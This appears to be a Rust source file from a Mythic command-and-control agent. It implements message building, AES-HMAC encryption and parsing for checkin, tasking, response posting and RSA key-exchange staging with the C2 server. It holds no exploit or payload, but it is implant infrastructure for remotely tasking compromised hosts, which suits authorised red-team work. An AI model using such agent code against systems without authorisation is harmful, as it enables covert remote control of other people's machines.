use alloc::{
    string::String,
    vec::Vec,
};
use core::cell::{Cell, RefCell};
use uuid::Uuid;

use crate::c2::{C2Transport, MythicError};
use crate::protocol::{
    Aes256HmacCrypto, CheckinInfo, MythicMessageError, ReqCheckin, ReqGetTasking,
    ReqPostResponse, ReqStagingRSA, ReqStagingTranslation, RespCheckin, RespGetTasking,
    RespPostResponse, RespStagingRSA, RespStagingTranslation, TaskResponse, decode_message,
    decode_message_plain, encode_message, encode_message_plain,
};

/// Wire packet with its pre-encryption JSON payload, for debugging.
///
/// Automatically populated by every `build_*` call in debug mode.
/// Access via [`Mythic::last_trace`].
#[cfg(debug_assertions)]
#[derive(Debug, Clone)]
pub struct PackTrace {
    pub json: String,
    pub packet: String,
}

/// High-level facade for building and parsing Mythic protocol messages.
///
/// Holds the agent's current UUID and an IV counter.  Encryption keys come
/// from the C2 at call time via [`C2Transport::aes_psk`]; the IV is
/// auto-generated from the counter for each message.
///
/// In debug builds, every `build_*` call automatically captures a
/// [`PackTrace`] accessible via [`last_trace`](Mythic::last_trace).
///
/// # UUID lifecycle
///
/// ```text
/// payloadUUID                          ←  payload execution starts
///   │
///   ├─ checkin ──────────────────────→ callbackUUID   (plain / static)
///   │
///   └─ staging_rsa ──→ tempUUID ──→ checkin ──→ callbackUUID   (RSA EKE)
/// ```
pub struct Mythic {
    agent_uuid: Uuid,
    iv_counter: Cell<u64>,
    #[cfg(debug_assertions)]
    last_trace: RefCell<Option<PackTrace>>,
}

impl Mythic {
    pub fn new(agent_uuid: Uuid) -> Self {
        Self {
            agent_uuid,
            iv_counter: Cell::new(0),
            #[cfg(debug_assertions)]
            last_trace: RefCell::new(None),
        }
    }

    /// The most recent packet trace, captured automatically in debug mode.
    #[cfg(debug_assertions)]
    pub fn last_trace(&self) -> Option<PackTrace> {
        self.last_trace.borrow().clone()
    }

    /// Current outer UUID used in message framing.
    pub fn agent_uuid(&self) -> Uuid {
        self.agent_uuid
    }

    /// Update the outer UUID (e.g. after checkin or staging_rsa response).
    pub fn set_agent_uuid(&mut self, uuid: Uuid) {
        self.agent_uuid = uuid;
    }

    // ── Checkin ───────────────────────────────────────

    pub fn build_checkin(
        &self, info: CheckinInfo, c2: &impl C2Transport,
    ) -> Result<String, MythicMessageError> {
        self.encode(&ReqCheckin::new(self.agent_uuid, info), c2)
    }

    pub fn build_checkin_minimal(
        &self, c2: &impl C2Transport,
    ) -> Result<String, MythicMessageError> {
        self.encode(&ReqCheckin::minimal(self.agent_uuid), c2)
    }

    pub fn parse_checkin(
        &self, packed: &str, c2: &impl C2Transport,
    ) -> Result<(Uuid, RespCheckin), MythicMessageError> {
        self.decode(packed, c2)
    }

    // ── GetTasking ────────────────────────────────────

    pub fn build_get_tasking(
        &self, tasking_size: i32, c2: &impl C2Transport,
    ) -> Result<String, MythicMessageError> {
        self.encode(&ReqGetTasking::new(tasking_size), c2)
    }

    pub fn parse_get_tasking(
        &self, packed: &str, c2: &impl C2Transport,
    ) -> Result<(Uuid, RespGetTasking), MythicMessageError> {
        self.decode(packed, c2)
    }

    // ── PostResponse ──────────────────────────────────

    pub fn build_post_response(
        &self, responses: Vec<TaskResponse>, c2: &impl C2Transport,
    ) -> Result<String, MythicMessageError> {
        self.encode(&ReqPostResponse::new(responses), c2)
    }

    pub fn parse_post_response(
        &self, packed: &str, c2: &impl C2Transport,
    ) -> Result<(Uuid, RespPostResponse), MythicMessageError> {
        self.decode(packed, c2)
    }

    // ── Staging RSA ───────────────────────────────────

    pub fn build_staging_rsa(
        &self, pub_key: &str, session_id: &str, c2: &impl C2Transport,
    ) -> Result<String, MythicMessageError> {
        self.encode(&ReqStagingRSA::new(pub_key.into(), session_id.into()), c2)
    }

    pub fn parse_staging_rsa(
        &self, packed: &str, c2: &impl C2Transport,
    ) -> Result<(Uuid, RespStagingRSA), MythicMessageError> {
        self.decode(packed, c2)
    }

    // ── Staging Translation ───────────────────────────

    pub fn build_staging_translation(
        &self,
        session_id: &str, enc_key: &str, dec_key: &str, crypto_type: &str,
        next_uuid: Uuid, message: &str, c2: &impl C2Transport,
    ) -> Result<String, MythicMessageError> {
        self.encode(&ReqStagingTranslation::new(
            session_id.into(), enc_key.into(), dec_key.into(),
            crypto_type.into(), next_uuid, message.into(),
        ), c2)
    }

    pub fn parse_staging_translation(
        &self, packed: &str, c2: &impl C2Transport,
    ) -> Result<(Uuid, RespStagingTranslation), MythicMessageError> {
        self.decode(packed, c2)
    }

    // ── Combined: build → send → parse ───────────────

    pub fn checkin<C: C2Transport>(
        &self, info: CheckinInfo, c2: &C,
    ) -> Result<(Uuid, RespCheckin), MythicError<C::Error>> {
        let pkt = self.build_checkin(info, c2)?;
        let reply = c2.checkin(&pkt).map_err(MythicError::Transport)?;
        Ok(self.parse_checkin(&reply, c2)?)
    }

    pub fn checkin_minimal<C: C2Transport>(
        &self, c2: &C,
    ) -> Result<(Uuid, RespCheckin), MythicError<C::Error>> {
        let pkt = self.build_checkin_minimal(c2)?;
        let reply = c2.checkin(&pkt).map_err(MythicError::Transport)?;
        Ok(self.parse_checkin(&reply, c2)?)
    }

    pub fn get_tasking<C: C2Transport>(
        &self, tasking_size: i32, c2: &C,
    ) -> Result<(Uuid, RespGetTasking), MythicError<C::Error>> {
        let pkt = self.build_get_tasking(tasking_size, c2)?;
        let reply = c2.get_tasking(&pkt).map_err(MythicError::Transport)?;
        Ok(self.parse_get_tasking(&reply, c2)?)
    }

    pub fn post_response<C: C2Transport>(
        &self, responses: Vec<TaskResponse>, c2: &C,
    ) -> Result<(Uuid, RespPostResponse), MythicError<C::Error>> {
        let pkt = self.build_post_response(responses, c2)?;
        let reply = c2.post_response(&pkt).map_err(MythicError::Transport)?;
        Ok(self.parse_post_response(&reply, c2)?)
    }

    pub fn staging_rsa<C: C2Transport>(
        &self, pub_key: &str, session_id: &str, c2: &C,
    ) -> Result<(Uuid, RespStagingRSA), MythicError<C::Error>> {
        let pkt = self.build_staging_rsa(pub_key, session_id, c2)?;
        let reply = c2.staging_rsa(&pkt).map_err(MythicError::Transport)?;
        Ok(self.parse_staging_rsa(&reply, c2)?)
    }

    pub fn staging_translation<C: C2Transport>(
        &self,
        session_id: &str, enc_key: &str, dec_key: &str, crypto_type: &str,
        next_uuid: Uuid, message: &str, c2: &C,
    ) -> Result<(Uuid, RespStagingTranslation), MythicError<C::Error>> {
        let pkt = self.build_staging_translation(
            session_id, enc_key, dec_key, crypto_type, next_uuid, message, c2,
        )?;
        let reply = c2.staging_translation(&pkt).map_err(MythicError::Transport)?;
        Ok(self.parse_staging_translation(&reply, c2)?)
    }

    // ── Internals ─────────────────────────────────────

    fn next_iv(&self) -> [u8; 16] {
        let n = self.iv_counter.get();
        self.iv_counter.set(n.wrapping_add(1));
        let mut iv = [0u8; 16];
        iv[..8].copy_from_slice(&n.to_le_bytes());
        iv
    }

    fn crypto_for(&self, c2: &impl C2Transport) -> Option<Aes256HmacCrypto> {
        c2.aes_psk().and_then(|b64| Aes256HmacCrypto::from_base64_key(&b64).ok())
    }

    fn encode<T: serde::Serialize>(
        &self, msg: &T, c2: &impl C2Transport,
    ) -> Result<String, MythicMessageError> {
        #[cfg(debug_assertions)]
        {
            let json = serde_json::to_string(msg)
                .map_err(|_| MythicMessageError::Serialize)?;
            let packet = match self.crypto_for(c2) {
                Some(c) => encode_message(msg, self.agent_uuid, &c, &self.next_iv())?,
                None => encode_message_plain(msg, self.agent_uuid)?,
            };
            *self.last_trace.borrow_mut() = Some(PackTrace { json, packet: packet.clone() });
            Ok(packet)
        }
        #[cfg(not(debug_assertions))]
        match self.crypto_for(c2) {
            Some(c) => encode_message(msg, self.agent_uuid, &c, &self.next_iv()),
            None => encode_message_plain(msg, self.agent_uuid),
        }
    }

    fn decode<T: serde::de::DeserializeOwned>(
        &self, packed: &str, c2: &impl C2Transport,
    ) -> Result<(Uuid, T), MythicMessageError> {
        match self.crypto_for(c2) {
            Some(c) => decode_message(packed, Some(self.agent_uuid), &c),
            None => decode_message_plain(packed, Some(self.agent_uuid)),
        }
    }
}
